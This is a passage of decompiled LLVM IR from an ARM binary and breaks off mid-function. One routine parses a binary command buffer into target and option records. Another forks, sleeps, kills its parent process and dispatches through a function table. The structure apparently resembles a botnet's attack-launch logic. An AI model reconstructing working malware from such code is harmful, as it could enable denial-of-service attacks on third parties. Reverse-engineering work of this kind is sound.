  %v9_ad20 = icmp eq i32 %v1_ad1c, %v1_acdc
  store i32 %v0_ad14, i32* %r1.global-to-local, align 4
  br i1 %v9_ad20, label %dec_label_pc_ad2c, label %dec_label_pc_ad0c

dec_label_pc_ad2c:                                ; preds = %dec_label_pc_ad1c, %dec_label_pc_acdc
  ret i32 %arg4

dec_label_pc_ad34:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_acf4
  %v0_ad34 = phi i32 [ %v0_acf4, %dec_label_pc_acf4 ], [ %v0_ad14, %dec_label_pc_ad0c ]
  %v1_ad34 = inttoptr i32 %v0_ad34 to i32*
  %v2_ad34 = load i32, i32* %v1_ad34, align 4
  ret i32 %v2_ad34

; uselistorder directives
  uselistorder i32 %v1_ad1c, { 1, 2, 0 }
  uselistorder i32 %v0_ad14, { 1, 0, 2 }
  uselistorder i32 %v0_ad14.in, { 1, 0 }
  uselistorder i32 %v0_acf4, { 1, 0, 2 }
  uselistorder i32 %v1_ace8, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
}

define i32 @function_ad40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_ad40:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ad40 = load i32, i32* @r4, align 4
  store i32 %v3_ad40, i32* %stack_var_-32, align 4
  %v6_ad40 = load i32, i32* @r5, align 4
  %v9_ad40 = load i32, i32* @r6, align 4
  %v12_ad40 = load i32, i32* @r7, align 4
  %v18_ad40 = load i32, i32* @sb, align 4
  %v0_ad44 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ad44, i32* @sb, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v1_ad4c = urem i32 %arg2, 256
  store i32 %v1_ad4c, i32* %r7.global-to-local, align 4
  %v0_ad58 = call i32 @fork()
  %v7_ad5c = icmp eq i32 %v0_ad58, -1
  %. = zext i1 %v7_ad5c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_ad58, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ad40
  store i32 1, i32* %r5.global-to-local, align 4
  br label %bb25

bb24:                                             ; preds = %dec_label_pc_ad40
  store i32 %., i32* %r5.global-to-local, align 4
  %v2_ad74 = icmp eq i1 %v7_ad5c, false
  br i1 %v2_ad74, label %bb26, label %bb25

bb25:                                             ; preds = %.thread2, %bb24
  %v3_ad78 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_ad78, i32* %r4.global-to-local, align 4
  store i32 %v6_ad40, i32* %r5.global-to-local, align 4
  store i32 %v9_ad40, i32* %r6.global-to-local, align 4
  store i32 %v12_ad40, i32* %r7.global-to-local, align 4
  store i32 %v18_ad40, i32* @sb, align 4
  ret i32 %v0_ad58

bb26:                                             ; preds = %bb24
  %v0_ad7c = call i32 @fork()
  %v7_ad80 = icmp eq i32 %v0_ad7c, -1
  store i32 %v0_ad7c, i32* %r4.global-to-local, align 4
  br i1 %v7_ad80, label %dec_label_pc_adb0, label %dec_label_pc_ad8c

dec_label_pc_ad8c:                                ; preds = %bb26
  %v2_ad8c = icmp eq i32 %v0_ad7c, 0
  br i1 %v2_ad8c, label %dec_label_pc_ad94, label %dec_label_pc_adb8

dec_label_pc_ad94:                                ; preds = %dec_label_pc_ad8c
  %v0_ad94 = load i32, i32* %r6.global-to-local, align 4
  %v1_ad98 = call i32 @_sleep(i32 %v0_ad94)
  %v0_ad9c = call i32 @getppid()
  %v0_ada4 = call i32 @_kill()
  %v0_ada8 = load i32, i32* %r4.global-to-local, align 4
  call void @exit(i32 %v0_ada8)
  unreachable

dec_label_pc_adb0:                                ; preds = %bb26
  %v0_adb0 = load i32, i32* %r5.global-to-local, align 4
  call void @exit(i32 %v0_adb0)
  unreachable

dec_label_pc_adb8:                                ; preds = %dec_label_pc_ad8c
  store i32 ptrtoint (i8** @global_var_1cd7c.110 to i32), i32* %r3.global-to-local, align 4
  %v2_adbc = load i8, i8* bitcast (i8** @global_var_1cd7c.110 to i8*), align 4
  %v3_adbc = zext i8 %v2_adbc to i32
  %v2_adc0 = icmp eq i8 %v2_adbc, 0
  br i1 %v2_adc0, label %dec_label_pc_ae04, label %dec_label_pc_adc8

dec_label_pc_adc8:                                ; preds = %dec_label_pc_adb8
  store i32 ptrtoint (i32* @global_var_1cd80.112 to i32), i32* %r3.global-to-local, align 4
  %v2_adcc = load i32, i32* @global_var_1cd80.112, align 4
  %v1_add0 = inttoptr i32 %v2_adcc to i32*
  %v2_add0 = load i32, i32* %v1_add0, align 4
  %v1_add4 = add i32 %v2_add0, 4
  %v2_add4 = inttoptr i32 %v1_add4 to i8*
  %v3_add4 = load i8, i8* %v2_add4, align 1
  %v4_add4 = zext i8 %v3_add4 to i32
  store i32 %v4_add4, i32* %r3.global-to-local, align 4
  %v1_add8 = load i32, i32* %r7.global-to-local, align 4
  %v9_add8 = icmp eq i32 %v4_add4, %v1_add8
  br i1 %v9_add8, label %dec_label_pc_ae0c, label %dec_label_pc_adf8.preheader

dec_label_pc_adf8.preheader:                      ; preds = %dec_label_pc_adc8
  %v1_addc = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_adf8

dec_label_pc_ade8:                                ; preds = %dec_label_pc_adf8
  %v4_ade8 = mul i32 %v1_adf8, 4
  %v5_ade8 = add i32 %v4_ade8, %v2_adcc
  %v6_ade8 = inttoptr i32 %v5_ade8 to i32*
  %v7_ade8 = load i32, i32* %v6_ade8, align 4
  %v1_adec = add i32 %v7_ade8, 4
  %v2_adec = inttoptr i32 %v1_adec to i8*
  %v3_adec = load i8, i8* %v2_adec, align 1
  %v4_adec = zext i8 %v3_adec to i32
  store i32 %v4_adec, i32* %r3.global-to-local, align 4
  %v9_adf0 = icmp eq i32 %v4_adec, %v1_add8
  br i1 %v9_adf0, label %dec_label_pc_ae0c, label %dec_label_pc_adf8

dec_label_pc_adf8:                                ; preds = %dec_label_pc_adf8.preheader, %dec_label_pc_ade8
  %v0_adf8 = phi i32 [ %v1_addc, %dec_label_pc_adf8.preheader ], [ %v1_adf8, %dec_label_pc_ade8 ]
  %v1_adf8 = add i32 %v0_adf8, 1
  %v9_adfc = icmp eq i32 %v1_adf8, %v3_adbc
  br i1 %v9_adfc, label %dec_label_pc_ae04, label %dec_label_pc_ade8

dec_label_pc_ae04:                                ; preds = %dec_label_pc_adf8, %dec_label_pc_adb8, %dec_label_pc_ae0c
  call void @exit(i32 0)
  unreachable

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_ade8, %dec_label_pc_adc8
  %v0_ae20 = phi i32 [ %v2_add0, %dec_label_pc_adc8 ], [ %v7_ade8, %dec_label_pc_ade8 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_ae20 = inttoptr i32 %v0_ae20 to i32*
  %v2_ae20 = load i32, i32* %v1_ae20, align 4
  call void @__pseudo_branch(i32 %v2_ae20)
  br label %dec_label_pc_ae04

; uselistorder directives
  uselistorder i32 %v1_adf8, { 2, 0, 1 }
  uselistorder i32 %v0_ad7c, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_ad5c, { 1, 0 }
  uselistorder i32 %v0_ad58, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder label %dec_label_pc_ae04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_adf8, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @function_ae30(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ae30:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v9_ae30 = load i32, i32* @r6, align 4
  %v12_ae30 = load i32, i32* @r7, align 4
  %v18_ae30 = load i32, i32* @sb, align 4
  %v21_ae30 = load i32, i32* @sl, align 4
  %v27_ae30 = load i32, i32* @lr, align 4
  %v7_ae34 = icmp eq i32 %arg2, 3
  store i1 %v7_ae34, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  %v0_ae40 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ae40, i32* @r4, align 4
  %tmp33 = icmp ult i32 %arg2, 4
  br i1 %tmp33, label %dec_label_pc_ae54, label %dec_label_pc_ae48

dec_label_pc_ae48:                                ; preds = %dec_label_pc_ae30
  %v7_ae48 = icmp eq i32 %arg2, 4
  store i1 %v7_ae48, i1* %cpsr_z.global-to-local, align 1
  %v1_ae4c = inttoptr i32 %v0_ae40 to i32*
  %v2_ae4c = load i32, i32* %v1_ae4c, align 4
  store i32 %v2_ae4c, i32* @sl, align 4
  br i1 %v7_ae48, label %dec_label_pc_ae54, label %dec_label_pc_ae5c

dec_label_pc_ae54:                                ; preds = %dec_label_pc_ae78, %.dec_label_pc_ae54_crit_edge, %dec_label_pc_ae48, %dec_label_pc_ae6c, %dec_label_pc_ae5c, %dec_label_pc_ae30
  %v29_ae58 = phi i32 [ %v29_ae58.pre, %.dec_label_pc_ae54_crit_edge ], [ %v0_ae40, %dec_label_pc_ae78 ], [ %v0_ae40, %dec_label_pc_ae48 ], [ %v0_ae40, %dec_label_pc_ae6c ], [ %v0_ae40, %dec_label_pc_ae5c ], [ %v0_ae40, %dec_label_pc_ae30 ]
  store i32 %v9_ae30, i32* @r6, align 4
  store i32 %v12_ae30, i32* @r7, align 4
  store i32 %v18_ae30, i32* @sb, align 4
  store i32 %v21_ae30, i32* @sl, align 4
  ret i32 %v29_ae58

dec_label_pc_ae5c:                                ; preds = %dec_label_pc_ae48
  %v7_ae5c = icmp eq i32 %arg2, 5
  store i1 %v7_ae5c, i1* %cpsr_z.global-to-local, align 1
  %v1_ae60 = add i32 %v0_ae40, 4
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
  store i32 %v4_ae60, i32* %r1.global-to-local, align 4
  br i1 %v7_ae5c, label %dec_label_pc_ae54, label %dec_label_pc_ae6c

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae5c
  %v1_ae6c = add i32 %v0_ae40, 5
  %v2_ae6c = inttoptr i32 %v1_ae6c to i8*
  %v3_ae6c = load i8, i8* %v2_ae6c, align 1
  %v4_ae6c = zext i8 %v3_ae6c to i32
  store i32 %v4_ae6c, i32* @r7, align 4
  %v2_ae70 = icmp eq i8 %v3_ae6c, 0
  store i1 %v2_ae70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ae70, label %dec_label_pc_ae54, label %dec_label_pc_ae78

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae6c
  %v3_ae78 = mul nuw nsw i32 %v4_ae6c, 4
  store i32 %v3_ae78, i32* @sb, align 4
  %v1_ae7c = add i32 %arg2, -6
  store i32 %v1_ae7c, i32* @r6, align 4
  %v2_ae80 = mul nuw nsw i32 %v4_ae6c, 5
  store i32 %v2_ae80, i32* @r8, align 4
  %v3_ae84 = icmp ult i32 %v1_ae7c, %v2_ae80
  %v9_ae84 = icmp eq i32 %v1_ae7c, %v2_ae80
  store i1 %v9_ae84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ae84, label %dec_label_pc_ae54, label %dec_label_pc_ae8c

dec_label_pc_ae8c:                                ; preds = %dec_label_pc_ae78
  store i32 %v4_ae6c, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_ae94 = call i32 @_calloc(i32 %v4_ae6c, i32 24)
  store i32 %v2_ae94, i32* %r0.global-to-local, align 4
  %v0_ae98 = load i32, i32* @r7, align 4
  %v2_ae98 = icmp eq i32 %v0_ae98, 0
  store i1 %v2_ae98, i1* %cpsr_z.global-to-local, align 1
  %v0_aea0 = load i32, i32* @r4, align 4
  %v1_aea0 = add i32 %v0_aea0, 6
  store i32 %v1_aea0, i32* %fp.global-to-local, align 4
  %tmp27 = icmp slt i32 %v0_ae98, 1
  br i1 %tmp27, label %dec_label_pc_aef8thread-pre-split, label %dec_label_pc_aea8

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae8c
  store i32 %v2_ae94, i32* %r1.global-to-local, align 4
  %v1_aeac = load i32, i32* @r8, align 4
  %v2_aeac = add i32 %v1_aeac, %v0_aea0
  store i32 %v2_aeac, i32* %ip.global-to-local, align 4
  store i32 %v0_aea0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_aebc

dec_label_pc_aebc:                                ; preds = %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge, %dec_label_pc_aea8
  %v2_aecc = phi i32 [ %v1_aee0, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v2_ae94, %dec_label_pc_aea8 ]
  %v0_aec8 = phi i32 [ %v0_aec8.pre, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v2_aeac, %dec_label_pc_aea8 ]
  %v0_aec4 = phi i32 [ %v0_aebc.pre, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v0_aea0, %dec_label_pc_aea8 ]
  %v1_aebc = add i32 %v0_aec4, 10
  %v2_aebc = inttoptr i32 %v1_aebc to i8*
  %v3_aebc = load i8, i8* %v2_aebc, align 1
  %v1_aec0 = add i32 %v0_aec4, 6
  %v2_aec0 = inttoptr i32 %v1_aec0 to i32*
  %v3_aec0 = load i32, i32* %v2_aec0, align 4
  store i32 %v3_aec0, i32* %r2.global-to-local, align 4
  %v1_aec4 = add i32 %v0_aec4, 5
  store i32 %v1_aec4, i32* %r0.global-to-local, align 4
  %v9_aec8 = icmp eq i32 %v0_aec8, %v1_aec4
  store i1 %v9_aec8, i1* %cpsr_z.global-to-local, align 1
  %v3_aecc = add i32 %v2_aecc, 20
  %v4_aecc = inttoptr i32 %v3_aecc to i8*
  store i8 %v3_aebc, i8* %v4_aecc, align 1
  %v0_aed0 = load i32, i32* %r2.global-to-local, align 4
  %v1_aed0 = load i32, i32* %r1.global-to-local, align 4
  %v2_aed0 = add i32 %v1_aed0, 4
  %v3_aed0 = inttoptr i32 %v2_aed0 to i32*
  store i32 %v0_aed0, i32* %v3_aed0, align 4
  %v0_aed4 = load i32, i32* %r2.global-to-local, align 4
  %v1_aed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_aed4 = add i32 %v1_aed4, 16
  %v3_aed4 = inttoptr i32 %v2_aed4 to i32*
  store i32 %v0_aed4, i32* %v3_aed4, align 4
  %v0_aed8 = load i32, i32* @r4, align 4
  %v1_aed8 = trunc i32 %v0_aed8 to i8
  %v2_aed8 = load i32, i32* %r1.global-to-local, align 4
  %v3_aed8 = inttoptr i32 %v2_aed8 to i8*
  store i8 %v1_aed8, i8* %v3_aed8, align 1
  %v0_aedc = load i32, i32* %lr.global-to-local, align 4
  %v1_aedc = trunc i32 %v0_aedc to i8
  %v2_aedc = load i32, i32* %r1.global-to-local, align 4
  %v3_aedc = add i32 %v2_aedc, 1
  %v4_aedc = inttoptr i32 %v3_aedc to i8*
  store i8 %v1_aedc, i8* %v4_aedc, align 1
  %v0_aee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_aee0 = add i32 %v0_aee0, 24
  store i32 %v1_aee0, i32* %r1.global-to-local, align 4
  %v0_aee4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aee4, label %dec_label_pc_aee8, label %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge

dec_label_pc_aebc.dec_label_pc_aebc_crit_edge:    ; preds = %dec_label_pc_aebc
  %v0_aebc.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_aec8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_aebc

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aebc
  %v0_aee8 = load i32, i32* @sb, align 4
  %v1_aee8 = load i32, i32* @r7, align 4
  %v1_aeec = load i32, i32* @r5, align 4
  %sum = add i32 %v1_aee8, %v0_aee8
  %v2_aeec = sub i32 %v1_aeec, %sum
  %v0_aef0 = load i32, i32* %r0.global-to-local, align 4
  %v1_aef0 = add i32 %v0_aef0, 6
  store i32 %v1_aef0, i32* %fp.global-to-local, align 4
  %v1_aef4 = add i32 %v2_aeec, -6
  store i32 %v1_aef4, i32* @r6, align 4
  br label %dec_label_pc_aef8

dec_label_pc_aef8thread-pre-split:                ; preds = %dec_label_pc_ae8c
  %v0_aef8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_aef8

dec_label_pc_aef8:                                ; preds = %dec_label_pc_aef8thread-pre-split, %dec_label_pc_aee8
  %v0_af04 = phi i32 [ %v1_aea0, %dec_label_pc_aef8thread-pre-split ], [ %v1_aef0, %dec_label_pc_aee8 ]
  %v1_aefc = phi i32 [ %v0_aef8.pr, %dec_label_pc_aef8thread-pre-split ], [ %v1_aef4, %dec_label_pc_aee8 ]
  %v2_aef8 = icmp eq i32 %v1_aefc, 0
  store i1 %v2_aef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aef8, label %dec_label_pc_b030, label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef8
  %v1_af04 = inttoptr i32 %v0_af04 to i8*
  %v2_af04 = load i8, i8* %v1_af04, align 1
  %v3_af04 = zext i8 %v2_af04 to i32
  store i32 %v3_af04, i32* @sb, align 4
  %v2_af08 = icmp eq i8 %v2_af04, 0
  store i1 %v2_af08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af08, label %dec_label_pc_afe8, label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_af04
  store i32 %v3_af04, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_af20 = call i32 @_calloc(i32 %v3_af04, i32 8)
  store i32 %v2_af20, i32* %r0.global-to-local, align 4
  %v0_af24 = load i32, i32* @sb, align 4
  %v2_af24 = icmp eq i32 %v0_af24, 0
  store i1 %v2_af24, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp slt i32 %v0_af24, 1
  br i1 %tmp28, label %dec_label_pc_afe8, label %dec_label_pc_af34

dec_label_pc_af34:                                ; preds = %dec_label_pc_af18
  %v0_af34 = load i32, i32* @r6, align 4
  %v1_af34 = add i32 %v0_af34, -1
  store i32 %v1_af34, i32* %r2.global-to-local, align 4
  %v7_af34 = icmp eq i32 %v0_af34, 1
  store i1 %v7_af34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_af34, label %dec_label_pc_b030, label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_af34
  %v0_af3c = load i32, i32* %fp.global-to-local, align 4
  %v1_af3c = add i32 %v0_af3c, 1
  %v2_af3c = inttoptr i32 %v1_af3c to i8*
  %v3_af3c = load i8, i8* %v2_af3c, align 1
  %v1_af40 = add i32 %v0_af34, -2
  store i32 %v1_af40, i32* %r2.global-to-local, align 4
  %v7_af40 = icmp eq i32 %v1_af34, 1
  store i1 %v7_af40, i1* %cpsr_z.global-to-local, align 1
  %v3_af44 = add i32 %v2_af20, 4
  %v4_af44 = inttoptr i32 %v3_af44 to i8*
  store i8 %v3_af3c, i8* %v4_af44, align 1
  %v0_af48 = load i32, i32* %fp.global-to-local, align 4
  %v1_af48 = add i32 %v0_af48, 1
  store i32 %v1_af48, i32* %r0.global-to-local, align 4
  %v0_af4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_af4c, label %dec_label_pc_b030, label %dec_label_pc_af50

dec_label_pc_af50:                                ; preds = %dec_label_pc_af3c
  %v1_af50 = add i32 %v0_af48, 2
  %v2_af50 = inttoptr i32 %v1_af50 to i8*
  %v3_af50 = load i8, i8* %v2_af50, align 1
  %v4_af50 = zext i8 %v3_af50 to i32
  store i32 %v4_af50, i32* @r4, align 4
  %v0_af54 = load i32, i32* %r2.global-to-local, align 4
  %v1_af54 = add i32 %v0_af54, -1
  store i32 %v1_af54, i32* @r8, align 4
  %v9_af58 = icmp eq i32 %v1_af54, %v4_af50
  store i1 %v9_af58, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af50, i32* %r0.global-to-local, align 4
  %v5_af60 = icmp slt i32 %v1_af54, %v4_af50
  br i1 %v5_af60, label %dec_label_pc_b030, label %dec_label_pc_af64

dec_label_pc_af64:                                ; preds = %dec_label_pc_af50
  store i32 %v2_af20, i32* @r5, align 4
  %v1_af6c = add i32 %v2_af20, 8
  %v1_af70 = add i32 %v0_af48, 3
  store i32 %v1_af70, i32* @r6, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_afb4

dec_label_pc_af80:                                ; preds = %dec_label_pc_afb4
  %v0_af80 = load i32, i32* @r8, align 4
  %v1_af80 = load i32, i32* @r4, align 4
  %v2_af80 = sub i32 %v0_af80, %v1_af80
  store i32 %v2_af80, i32* %r2.global-to-local, align 4
  %v9_af80 = icmp eq i32 %v0_af80, %v1_af80
  store i1 %v9_af80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af80, label %dec_label_pc_b030, label %dec_label_pc_af88

dec_label_pc_af88:                                ; preds = %dec_label_pc_af80
  %v1_af88 = load i32, i32* @r6, align 4
  %v2_af88 = add i32 %v1_af88, %v1_af80
  %v3_af88 = inttoptr i32 %v2_af88 to i8*
  %v4_af88 = load i8, i8* %v3_af88, align 1
  store i32 %v2_af88, i32* %r0.global-to-local, align 4
  %v1_af90 = add i32 %v2_af80, -1
  store i32 %v1_af90, i32* %r2.global-to-local, align 4
  %v7_af90 = icmp eq i32 %v2_af80, 1
  store i1 %v7_af90, i1* %cpsr_z.global-to-local, align 1
  %v3_af94 = add i32 %v2_af94, 4
  %v4_af94 = inttoptr i32 %v3_af94 to i8*
  store i8 %v4_af88, i8* %v4_af94, align 1
  %v0_af98 = load i32, i32* %r0.global-to-local, align 4
  %v0_af9c = load i32, i32* %r2.global-to-local, align 4
  %v1_af9c = add i32 %v0_af9c, -1
  store i32 %v1_af9c, i32* @r8, align 4
  %v1_afa0 = add i32 %v0_af98, 2
  store i32 %v1_afa0, i32* @r6, align 4
  %v0_afa4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afa4, label %dec_label_pc_b030, label %dec_label_pc_afa8

dec_label_pc_afa8:                                ; preds = %dec_label_pc_af88
  %v1_af98 = add i32 %v0_af98, 1
  %v2_afa8 = inttoptr i32 %v1_af98 to i8*
  %v3_afa8 = load i8, i8* %v2_afa8, align 1
  %v4_afa8 = zext i8 %v3_afa8 to i32
  store i32 %v4_afa8, i32* @r4, align 4
  %v2_afac = sub i32 %v1_af9c, %v4_afa8
  %tmp30 = sub i32 0, %v2_afac
  %v6_afac = and i32 %v1_af9c, %tmp30
  %v7_afac = icmp slt i32 %v6_afac, 0
  %v8_afac = icmp slt i32 %v2_afac, 0
  %v9_afac = icmp eq i32 %v1_af9c, %v4_afa8
  store i1 %v9_afac, i1* %cpsr_z.global-to-local, align 1
  %v2_afb0 = xor i1 %v8_afac, %v7_afac
  br i1 %v2_afb0, label %dec_label_pc_b030, label %dec_label_pc_afb4

dec_label_pc_afb4:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_af64
  %v0_afb8 = phi i32 [ %v4_af50, %dec_label_pc_af64 ], [ %v4_afa8, %dec_label_pc_afa8 ]
  %v2_af94 = phi i32 [ %v1_af6c, %dec_label_pc_af64 ], [ %v1_afd8, %dec_label_pc_afa8 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_afb8 = add nuw nsw i32 %v0_afb8, 1
  store i32 %v1_afb8, i32* %r0.global-to-local, align 4
  %v2_afbc = call i32 @_calloc(i32 %v1_afb8, i32 1)
  store i32 %v2_afbc, i32* %r0.global-to-local, align 4
  %v0_afc0 = load i32, i32* @r6, align 4
  store i32 %v0_afc0, i32* %r1.global-to-local, align 4
  %v1_afc4 = load i32, i32* @r5, align 4
  %v2_afc4 = inttoptr i32 %v1_afc4 to i32*
  store i32 %v2_afbc, i32* %v2_afc4, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r2.global-to-local, align 4
  %v3_afcc = call i32 @function_13ad0(i32 %v2_afbc, i32 %v0_afc0, i32 %v0_afc8)
  store i32 %v3_afcc, i32* %r0.global-to-local, align 4
  store i32 %v2_af94, i32* @r5, align 4
  %v0_afd4 = load i32, i32* %fp.global-to-local, align 4
  %v1_afd4 = add i32 %v0_afd4, 1
  store i32 %v1_afd4, i32* %fp.global-to-local, align 4
  %v1_afd8 = add i32 %v2_af94, 8
  store i32 %v1_afd8, i32* %ip.global-to-local, align 4
  %v1_afdc = load i32, i32* @sb, align 4
  %v9_afdc = icmp eq i32 %v1_afd4, %v1_afdc
  store i1 %v9_afdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_afdc, label %dec_label_pc_afe8, label %dec_label_pc_af80

dec_label_pc_afe8:                                ; preds = %dec_label_pc_afb4, %dec_label_pc_af18, %dec_label_pc_af04
  %stack_var_-48.1 = phi i32 [ %v3_af04, %dec_label_pc_af04 ], [ %v0_af24, %dec_label_pc_af18 ], [ %v0_af24, %dec_label_pc_afb4 ]
  %stack_var_-52.2 = phi i32 [ %v3_af04, %dec_label_pc_af04 ], [ %v2_af20, %dec_label_pc_af18 ], [ %v2_af20, %dec_label_pc_afb4 ]
  %v0_afe8 = call i32* @__errno_location()
  %v0_afec = load i32, i32* @sl, align 4
  %v1_afec = and i32 %v0_afec, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %stack_var_-48.1, i32* %ip.global-to-local, align 4
  %v3_aff8 = mul i32 %v0_afec, 16777216
  %v4_affc = mul i32 %v1_afec, 256
  %v5_affc = or i32 %v4_affc, %v3_aff8
  store i32 %v5_affc, i32* %r1.global-to-local, align 4
  %v1_aff4 = udiv i32 %v0_afec, 256
  %v3_b000 = and i32 %v1_aff4, 65280
  store i32 %v3_b000, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v0_afe8, align 4
  %v1_b00c = load i32, i32* @sl, align 4
  %v4_b00c = udiv i32 %v1_b00c, 16777216
  %v5_b00c = or i32 %v4_b00c, %v3_b000
  %v0_b010 = load i32, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-52.2, i32* %ip.global-to-local, align 4
  %v1_b018 = load i32, i32* %r1.global-to-local, align 4
  %v2_b018 = or i32 %v5_b00c, %v1_b018
  store i32 %v2_b018, i32* %r0.global-to-local, align 4
  store i32 %v4_ae60, i32* %r1.global-to-local, align 4
  %v0_b024 = load i32, i32* @r7, align 4
  store i32 %v0_b024, i32* %r2.global-to-local, align 4
  %v6_b02c = trunc i32 %v0_b010 to i8
  %v7_b02c = call i32 @function_ad40(i32 %v2_b018, i32 %v4_ae60, i32 %v0_b024, i32 %v2_ae94, i8 %v6_b02c, i32 %stack_var_-52.2)
  store i32 %v7_b02c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b030

dec_label_pc_b030:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_af88, %dec_label_pc_af80, %dec_label_pc_af50, %dec_label_pc_af3c, %dec_label_pc_af34, %dec_label_pc_aef8, %dec_label_pc_afe8
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_aef8 ], [ %stack_var_-52.2, %dec_label_pc_afe8 ], [ %v2_af20, %dec_label_pc_af34 ], [ %v2_af20, %dec_label_pc_af3c ], [ %v2_af20, %dec_label_pc_af50 ], [ %v2_af20, %dec_label_pc_af80 ], [ %v2_af20, %dec_label_pc_af88 ], [ %v2_af20, %dec_label_pc_afa8 ]
  store i32 %v2_ae94, i32* %r1.global-to-local, align 4
  %v2_b034 = icmp eq i32 %v2_ae94, 0
  store i1 %v2_b034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b034, label %bb31, label %bb

bb:                                               ; preds = %dec_label_pc_b030
  store i32 %v2_ae94, i32* %r0.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_b030, %bb
  store i32 45120, i32* %lr.global-to-local, align 4
  %v1_b03c = xor i1 %v2_b034, true
  call void @__pseudo_cond_branch(i1 %v1_b03c, i32 ptrtoint (i32* @global_var_8de4.114 to i32))
  %v2_b044 = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_b044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b044, label %.dec_label_pc_ae54_crit_edge, label %dec_label_pc_b04c

.dec_label_pc_ae54_crit_edge:                     ; preds = %bb31
  %v29_ae58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ae54

dec_label_pc_b04c:                                ; preds = %bb31
